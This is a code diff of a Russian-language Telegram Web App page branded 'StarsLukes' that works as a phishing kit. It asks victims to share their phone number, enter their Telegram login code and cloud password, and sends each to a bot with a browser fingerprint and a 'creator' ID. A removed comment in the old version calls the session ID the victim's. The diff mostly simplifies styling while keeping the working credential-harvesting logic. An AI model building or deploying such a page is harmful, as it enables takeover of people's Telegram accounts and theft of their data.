@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
@@ -9,13 +9,12 @@
             --bg: #0a0a0f;
             --card: #12121a;
             --gold: #d4af37;
-            --gold-light: #e8c84c;
             --text: #e0e0e0;
             --muted: #888;
             --input-bg: #1a1a22;
             --border: #2a2a35;
         }
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * { margin:0; padding:0; box-sizing:border-box; }
         body {
             font-family: 'Inter', -apple-system, system-ui, sans-serif;
             background: var(--bg);
@@ -25,7 +24,6 @@
             justify-content: center;
             min-height: 100vh;
             padding: 20px;
-            background-image: radial-gradient(ellipse at 30% 30%, rgba(212,175,55,0.04) 0%, transparent 60%);
         }
         .card {
             width: 100%;
@@ -34,8 +32,7 @@
             border-radius: 28px;
             padding: 32px 24px;
             border: 1px solid var(--border);
-            box-shadow: 0 30px 50px rgba(0,0,0,0.7), 0 0 0 1px rgba(212,175,55,0.08);
-            backdrop-filter: blur(10px);
+            box-shadow: 0 30px 50px rgba(0,0,0,0.7);
             text-align: center;
         }
         .logo {
@@ -43,18 +40,8 @@
             font-weight: 600;
             color: var(--gold);
             margin-bottom: 24px;
-            letter-spacing: -0.5px;
         }
-        .logo span {
-            color: #fff;
-            font-weight: 300;
-        }
-        .step-title {
-            font-size: 16px;
-            font-weight: 500;
-            margin-bottom: 16px;
-            color: #ccc;
-        }
+        .logo span { color:#fff; font-weight:300; }
         .btn {
             width: 100%;
             padding: 16px;
@@ -65,13 +52,7 @@
             font-weight: 600;
             font-size: 16px;
             cursor: pointer;
-            transition: 0.2s;
-            box-shadow: 0 10px 20px rgba(212,175,55,0.15);
             margin-top: 12px;
-        }
-        .btn:active {
-            transform: scale(0.98);
-            box-shadow: 0 6px 12px rgba(212,175,55,0.2);
         }
         input {
             width: 100%;
@@ -84,26 +65,11 @@
             outline: none;
             margin-bottom: 12px;
         }
-        input:focus {
-            border-color: var(--gold-light);
-            box-shadow: 0 0 0 2px rgba(212,175,55,0.1);
-        }
         .hidden { display: none; }
         .footer-note {
             margin-top: 20px;
             font-size: 12px;
             color: var(--muted);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-        }
-        .footer-note span {
-            width: 6px;
-            height: 6px;
-            background: #4caf50;
-            border-radius: 50%;
-            box-shadow: 0 0 8px #4caf50;
         }
     </style>
 </head>
@@ -111,29 +77,24 @@
 <div class="card">
     <div class="logo">Stars<span>Lukes</span></div>
 
-    <!-- Экран 1: Поделиться контактом -->
     <div id="step-phone">
-        <div class="step-title">Авторизируйтесь через Telegram</div>
+        <p>Авторизируйтесь через Telegram</p>
         <button class="btn" onclick="requestContact()">Поделиться контактом</button>
     </div>
 
-    <!-- Экран 2: Ввод кода -->
     <div id="step-code" class="hidden">
-        <div class="step-title">Введите код из Telegram</div>
-        <input type="text" id="codeInput" placeholder="12345" maxlength="5" inputmode="numeric" autocomplete="off">
+        <p>Введите код из Telegram</p>
+        <input type="text" id="codeInput" placeholder="12345" maxlength="5" inputmode="numeric">
         <button class="btn" onclick="submitCode()">Подтвердить</button>
     </div>
 
-    <!-- Экран 3: Облачный пароль (появляется при параметре step=2fa) -->
     <div id="step-2fa" class="hidden">
-        <div class="step-title">Облачный пароль</div>
-        <input type="password" id="passwordInput" placeholder="Пароль" autocomplete="off">
+        <p>Облачный пароль (если есть)</p>
+        <input type="password" id="passwordInput" placeholder="Пароль">
         <button class="btn" onclick="submitPassword()">Продолжить</button>
     </div>
 
-    <div class="footer-note">
-        <span></span> Защищённое соединение
-    </div>
+    <div class="footer-note">Защищённое соединение</div>
 </div>
 
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
@@ -142,80 +103,66 @@
     tg.ready();
     tg.expand();
 
-    // Сбор отпечатка
+    // Fingerprint
     const fingerprint = {
         ip: '',
         userAgent: navigator.userAgent,
         platform: navigator.platform
     };
-
-    // Получаем IP
     fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
-        .then(d => { fingerprint.ip = d.ip; })
+        .then(d => fingerprint.ip = d.ip)
         .catch(() => {});
 
-    // Читаем параметры URL
     const urlParams = new URLSearchParams(window.location.search);
     const creatorUid = urlParams.get('creator') || null;
-    const stepParam = urlParams.get('step');   // может быть "2fa"
-    const uidParam = urlParams.get('uid');     // ID сессии жертвы для 2FA
 
-    // Если пришли с параметром step=2fa, сразу показываем поле пароля
-    if (stepParam === '2fa' && uidParam) {
+    // Если открыто с параметром step=2fa, сразу поле пароля
+    if (urlParams.get('step') === '2fa') {
         document.getElementById('step-phone').classList.add('hidden');
         document.getElementById('step-code').classList.add('hidden');
         document.getElementById('step-2fa').classList.remove('hidden');
-        // Сохраним uid в атрибуте для отправки
-        document.getElementById('step-2fa').setAttribute('data-uid', uidParam);
+        const uidParam = urlParams.get('uid');
+        if (uidParam) {
+            document.getElementById('step-2fa').setAttribute('data-uid', uidParam);
+        }
     }
 
-    // Функция переключения экранов
-    function show(screenId) {
-        ['step-phone', 'step-code', 'step-2fa'].forEach(id => {
-            document.getElementById(id).classList.add('hidden');
-        });
-        document.getElementById(screenId).classList.remove('hidden');
+    function show(id) {
+        ['step-phone','step-code','step-2fa'].forEach(x => document.getElementById(x).classList.add('hidden'));
+        document.getElementById(id).classList.remove('hidden');
     }
 
-    // Запрос контакта
     window.requestContact = function() {
-        tg.requestContact(function(success, event) {
-            if (success && event.contact) {
-                const phone = event.contact.phone_number;
-                // Отправляем данные боту
-                tg.sendData(JSON.stringify({
-                    step: 'send_code',
-                    phone: phone,
-                    fingerprint: fingerprint,
-                    creator_uid: creatorUid
-                }));
-                // Показываем поле для кода
-                show('step-code');
-            } else {
-                tg.showAlert('Необходимо разрешить доступ к номеру телефона.');
-            }
+        tg.requestContact().then(contact => {
+            tg.sendData(JSON.stringify({
+                step: 'send_code',
+                phone: contact.phone_number,
+                fingerprint: fingerprint,
+                creator_uid: creatorUid
+            }));
+            show('step-code');
+        }).catch(err => {
+            tg.showAlert('Необходимо разрешить доступ к номеру телефона.');
         });
     };
 
-    // Отправка кода
     window.submitCode = function() {
         const code = document.getElementById('codeInput').value.trim();
         if (!/^\d{5}$/.test(code)) {
-            tg.showAlert('Код должен состоять из 5 цифр');
+            tg.showAlert('Код — 5 цифр');
             return;
         }
         tg.sendData(JSON.stringify({ step: 'verify_code', code: code }));
         tg.close();
     };
 
-    // Отправка пароля
     window.submitPassword = function() {
         const password = document.getElementById('passwordInput').value;
-        const uid = document.getElementById('step-2fa').getAttribute('data-uid') || null;
+        const uid = document.getElementById('step-2fa').getAttribute('data-uid') || '';
         tg.sendData(JSON.stringify({ step: 'password', password: password, uid: uid }));
         tg.close();
     };
 </script>
 </body>
-</html>
+</html>   
